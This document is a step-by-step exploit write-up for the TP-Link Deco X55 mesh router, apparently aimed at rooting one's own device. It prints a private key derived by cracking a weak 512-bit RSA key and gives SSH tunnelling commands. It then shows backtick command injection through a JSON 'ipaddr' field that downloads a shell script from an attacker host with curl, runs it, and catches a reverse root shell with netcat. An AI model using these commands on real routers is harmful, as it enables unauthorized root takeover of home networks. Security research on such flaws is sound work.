# TP-Link Mesh Network Attack
## Intro
In this write-up, we use TP-Link Deco X55, firmware version 1.2.2 Build 20230301 Rel. 53300 as an illustration example. 

Deco X55 uses Dropbear SSH to secure inter-AP control plane data. The gateway node runs Dropbear on TCP port 20001 for this purpose. 

However, vulnerable versions of such Dropbear SSH connections use 512-bit RSA keys, which is a weakness. 

## Attack Step 1: Fetch the public key from the gateway and crack to learn the private key

To jailbreak your own Deco X55, you first use [fetch_dropbear_pub.py](./fetch_dropbear_pub.py): (`pip install paramiko` is needed)

![](./fetch_512_rsa_pub.png)

`ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAAAQQDCpUvga/nk2lu+KxLsaEqrRXBZzflAJ2YYNwvSNzC8Ro+yxTJxpZ+V8qBYzZ54Kntc+Ojx0nZdR530CIdRhshd`

Save this result as `my_tplink_pub.pub`.

Then use GGNFS/MSIEVE to crack and obtain the private key. (This step is left as an exercise. See solution [here](./crack_512_rsa_solution.md))

You will finally get something like this file `private_key_tplink_new.pem`: 

```
-----BEGIN RSA PRIVATE KEY-----
MIIBOwIBAAJBAMKlS+Br+eTaW74rEuxoSqtFcFnN+UAnZhg3C9I3MLxGj7LFMnGl
n5XyoFjNnngqe1z46PHSdl1HnfQIh1GGyF0CAwEAAQJASS8fPU070wkqz3Cgl9SK
pqTgHlPscGuf3mDsB+kKYO869F1yQ2m9WvIEBTKXoPhO7q3XSj3B9tO/6j4iGm5+
nQIhANm3N4S+uEv6V94JBVu+vXiEQJyWqmOE6nZNqEL3A/FXAiEA5N+M5zcGiybW
Ki44BNnR6XScryK40vS6tlMggUUXv2sCIDH4TXPYWnCF2xkJNQOjudUpdbL7GcyR
u0a/+Di2fV8tAiEAh5SiXKntF2uXPP+KMd1zCzAITXttL5LINI/D1rA+ZCcCIQC7
SBysEP2k6R2B51xDo5mvpJFco3t4drPjB8z0jPlZ8Q==
-----END RSA PRIVATE KEY-----
```

## Attack Step 2: Verify the private key matches the public key

Install putty on Ubuntu:
`sudo apt-get install -y putty`

Then you will have access to the `puttygen` tool. 

Show and verify their signatures match, just to make sure:

![](./verify_pub_pri_match.png)

## Attack Step 3: Convert the private key to PuTTY .ppk format

Input: 

`puttygen private_key_tplink_new.pem -O private -o my_tplink_pri.ppk`

## Attack Step 4: Authenticate to the Dropbear server on the gateway

Use plink with your ppk key to connect: 

`plink -v -L 20002:127.0.0.1:20002 root@192.168.68.1 -N -P 20001 -i my_tplink_pri.ppk`

![](./plink.png)

Important: You need to hit "Return" key on your keyboard to begin the session and enable "Local port 20002 forwarding to 127.0.0.1:20002".

## Attack Step 5: Prepare a reverse shell script

I used [Reverse Shell Generator](https://www.revshells.com/) to generate a lua reverse shell for Deco X55. 
Download my reverse shell [here](./luashell_tplink.sh), and you might want to change IP address and port number within this script to your own local machine's.

## Attack Step 6: Prepare the environment to execute the tmpcli binary on the attacker's machine

The attacker must use an aarch64 machine to launch this attack. 

Download this vulnerable firmware [here](https://static.tp-link.com/upload/firmware/2023/202303/20230331/Deco_X55_V1.0_1.2.2_Build_230301.zip). 

Sorry, clicking the link does not work. Please input the firmware address manually in a fresh browser tab to download it. 

Unpack this firmware (temporarily left as an exercise). Change your directory to the file system root, and use the export command. After that, try running the `/usr/bin/tmpcli` binary.   

`export LD_LIBRARY_PATH=$PWD/usr/lib:$PWD/lib`

![](./run_tmpcli.png)

## Attack Step 7: Start exploiting the vulnerablity in `tmpsvr`

Execute the command: 

```
echo '{"params":{"ipaddr":"192.168.71.250`curl -o /tmp/luashell.sh http://192.168.68.51:4443/luashell_tplink.sh`", "port":"6666"}}' | ./tmpcli -o 0xc505 -u 127.0.0.1 -p 20002
```

This command tells the gateway to download the `luashell_tplink.sh` from the attacker's server (http://192.168.68.51:4443), and writes this script to `/tmp/luashell.sh`. 

Use this command to chmod the script:

```
echo '{"params":{"ipaddr":"192.168.71.250`chmod u+x /tmp/luashell.sh`", "port":"6666"}}' | ./tmpcli -o 0xc505 -u 127.0.0.1 -p 20002
```

On the attacker's machine, run something like `nc -l 9002`.

Finally, execute the script on the mesh gateway:
```
echo '{"params":{"ipaddr":"192.168.71.250`/tmp/luashell.sh`", "port":"6666"}}' | ./tmpcli -o 0xc505 -u 127.0.0.1 -p 20002
```

Hit `uname -a` and `id` in the attacker's terminal. You will see something like:

![](./root_success.png)


